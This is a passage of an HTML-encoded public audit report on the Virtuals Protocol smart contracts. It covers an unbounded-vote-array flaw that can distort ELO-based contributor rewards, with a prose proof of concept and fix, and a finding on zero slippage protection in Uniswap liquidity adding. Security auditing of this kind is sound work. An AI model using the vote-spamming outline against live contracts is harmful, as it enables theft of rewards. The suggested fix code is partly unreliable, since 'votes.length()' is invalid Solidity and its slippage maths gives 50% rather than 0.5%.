impacts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 serviceId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 impact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint i = 0; i \u0026lt; services.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            serviceId = services[i];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            impact = serviceNftContract.getImpact(serviceId);  //@audit \u0026lt;--here impacts are taken from serviceNft\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (impact == 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                continue;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ServiceReward storage serviceReward = _serviceRewards[serviceId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (serviceReward.impact == 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                serviceReward.impact = impact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            _rewardImpacts[reward.id][serviceNftContract.getCore(serviceId)] += impact; //\u0026lt;-- impacts are rewarded\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-10\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUsers, or even contributors can spam it, leaving the \u003ccode\u003eServiceNft\u003c/code\u003e of a proposal with an ELO that severely misrepresents what the actual value of the proposal could be, up to the limit differences that they required in \u003ccode\u003eelo.sol\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eMoreover, since the impact (a param of a \u003ccode\u003eserviceNft\u003c/code\u003e which represents a value of sorts for the service over the previous implementation) is used to calculate contributor rewards (at least as it is shown in \u003ccode\u003eAgentRewardv2.sol\u003c/code\u003e and \u003ccode\u003eAgentRewardv1.sol\u003c/code\u003e), this could also inflate them, giving more rewards than due.\u003c/p\u003e\n\u003cp\u003eFor \u003ccode\u003eAgentRewardv3\u003c/code\u003e we’d have to think that either it doesn’t rewards contributions, is partially used, or is unfinished. We don’t really know which one it is.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eInside \u003ccode\u003eagentDAO::_updateMaturity\u003c/code\u003e add a statement after decoding the params to check that the length of the array of votes/battles is 10 (you could also replace it with a variable):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address contributionNft = IAgentNft(_agentNft).getContributionNft();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address owner = IERC721(contributionNft).ownerOf(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (owner == address(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool isModel = IContributionNft(contributionNft).isModel(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!isModel) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory votes = abi.decode(params, (uint8[]));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+       if(votes.length() != 10) revert();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = _calcMaturity(proposalId, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_proposalMaturities[proposalId] += (maturity * weight);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit ValidatorEloRating(proposalId, account, maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-12\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThere’s a proposal for a model update.\u003c/li\u003e\n\u003cli\u003eA user or the contributor submits a malicious (or many malicious) vote directly to the chain, with more rounds than the 10 determined in the whitepaper, either for or against the proposal.\u003c/li\u003e\n\u003cli\u003eThe ELO and the maturity increases (or decreases) more sharply with those votes.\u003c/li\u003e\n\u003cli\u003eThe resulting \u003ccode\u003eserviceNft\u003c/code\u003e would have really incorrect information.\u003c/li\u003e\n\u003cli\u003eThe resulting maturity of the \u003ccode\u003eserviceNft\u003c/code\u003e could end up with an impact of 0 (or a low value) and leave contributor without (or with reduced) rewards, or it could get inflated (and give more rewards than it is fair).\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\" style=\"position:relative;\"\u003e\u003ca href=\"#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\" aria-label=\"m 12 no slippage protection during adding liquidity to uniswap permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-49\"\u003e[M-12] No slippage protection during adding liquidity to uniswap\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-429\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-821\"\u003eBestBugBusters\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-764\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-126\"\u003efelconsec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-17\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-785\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-464\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-267\"\u003epro_king\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-678\"\u003eunique\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-732\"\u003ewahedtalash77\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003e_executeApplication\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e, during the process of adding liquidity using Uniswap’s \u003ccode\u003eIUniswapV2Router02.addLiquidity\u003c/code\u003e method, slippage tolerance is set to 0 for both \u003ccode\u003etoken\u003c/code\u003e and \u003ccode\u003eassetToken\u003c/code\u003e. Specifically, in the following line:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// slippage tolerance for token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// slippage tolerance for assetToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere, the \u003ccode\u003e0\u003c/code\u003e values for slippage tolerance mean that the liquidity addition will fail if the price of either \u003ccode\u003etoken\u003c/code\u003e or \u003ccode\u003eassetToken\u003c/code\u003e fluctuates even slightly between when the transaction is initiated and when it’s executed. This is because Uniswap requires that the amount of tokens being swapped remains within a certain tolerance range to prevent slippage.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo mitigate this issue, the following steps are recommended:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIntroduce slippage protection\u003c/strong\u003e: Modify the \u003ccode\u003eaddLiquidity\u003c/code\u003e call to include a non-zero slippage tolerance. This ensures that the liquidity addition will proceed within a reasonable range of price variation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 0.5% slippage tolerance (adjustable)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eslippageTolerance\u003c/code\u003e: The percentage tolerance for slippage. This should be adjusted based on the application’s tolerance for price fluctuation (e.g., 0.5% or 1%).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etokenAmountMin\u003c/code\u003e and \u003ccode\u003eassetAmountMin\u003c/code\u003e: These variables calculate the minimum acceptable amounts of \u003ccode\u003etoken\u003c/code\u003e and 